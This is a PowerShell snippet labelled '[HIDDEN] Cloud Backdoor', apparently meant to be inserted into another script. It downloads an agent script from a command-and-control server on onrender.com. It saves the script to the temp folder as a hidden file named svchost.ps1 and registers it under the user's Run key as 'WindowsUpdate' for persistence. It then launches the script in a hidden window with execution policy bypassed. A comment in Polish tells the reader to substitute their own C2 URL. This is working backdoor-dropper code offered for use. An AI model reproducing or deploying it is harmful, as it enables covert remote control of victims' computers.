# ─── [HIDDEN] Cloud Backdoor ───────────────────────────────────────
Write-Host ""
Write-Host ">>> [DEBUG] Starting backdoor deployment..." -ForegroundColor Yellow

$C2_URL = "https://c2-panel.onrender.com"  # ← ZMIEŃ NA SWÓJ URL!
Write-Host ">>> [DEBUG] C2_URL = $C2_URL" -ForegroundColor Yellow

$agentScript = "$env:TEMP\svchost.ps1"
Write-Host ">>> [DEBUG] Agent path = $agentScript" -ForegroundColor Yellow

# Step 1: Download agent.ps1
try {
    Write-Host ">>> [DEBUG] Downloading agent.ps1..." -ForegroundColor Yellow
    $wc = New-Object System.Net.WebClient
    $content = $wc.DownloadString("$C2_URL/agent.ps1")
    Write-Host ">>> [DEBUG] Downloaded $($content.Length) characters" -ForegroundColor Green
}
catch {
    Write-Host ">>> [ERROR] Download failed!" -ForegroundColor Red
    Write-Host ">>> [ERROR] $_" -ForegroundColor Red
    Write-Host ">>> [ERROR] $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ">>> [ERROR] StackTrace: $($_.ScriptStackTrace)" -ForegroundColor Red
}

# Step 2: Write to disk
try {
    Write-Host ">>> [DEBUG] Writing agent to disk..." -ForegroundColor Yellow
    [System.IO.File]::WriteAllText($agentScript, $content)
    (Get-Item $agentScript -Force).Attributes = 'Hidden,Archive'
    Write-Host ">>> [DEBUG] File written successfully" -ForegroundColor Green
    
    # Verify file exists
    if (Test-Path $agentScript) {
        Write-Host ">>> [DEBUG] File exists on disk, size: $((Get-Item $agentScript).Length) bytes" -ForegroundColor Green
    }
    else {
        Write-Host ">>> [ERROR] File NOT found after write!" -ForegroundColor Red
    }
}
catch {
    Write-Host ">>> [ERROR] Write to disk failed!" -ForegroundColor Red
    Write-Host ">>> [ERROR] $_" -ForegroundColor Red
    Write-Host ">>> [ERROR] $($_.Exception.Message)" -ForegroundColor Red
}

# Step 3: Registry persistence
try {
    Write-Host ">>> [DEBUG] Setting registry persistence..." -ForegroundColor Yellow
    $runPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $runPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$agentScript`"" -Force
    Write-Host ">>> [DEBUG] Registry key set successfully" -ForegroundColor Green
    
    # Verify
    $regCheck = Get-ItemProperty -Path $runPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue
    if ($regCheck) {
        Write-Host ">>> [DEBUG] Registry verified: $($regCheck.WindowsUpdate)" -ForegroundColor Green
    }
}
catch {
    Write-Host ">>> [ERROR] Registry persistence failed!" -ForegroundColor Red
    Write-Host ">>> [ERROR] $_" -ForegroundColor Red
}

# Step 4: Launch agent
try {
    Write-Host ">>> [DEBUG] Launching agent process..." -ForegroundColor Yellow
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$agentScript`""
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    $proc = [System.Diagnostics.Process]::Start($psi)
    Write-Host ">>> [DEBUG] Agent launched with PID: $($proc.Id)" -ForegroundColor Green
}
catch {
    Write-Host ">>> [ERROR] Launch failed!" -ForegroundColor Red
    Write-Host ">>> [ERROR] $_" -ForegroundColor Red
}

Write-Host ">>> [DEBUG] Backdoor deployment finished" -ForegroundColor Yellow
Write-Host ""
# ─── [END] ──────────────────────────────────────────────────────────
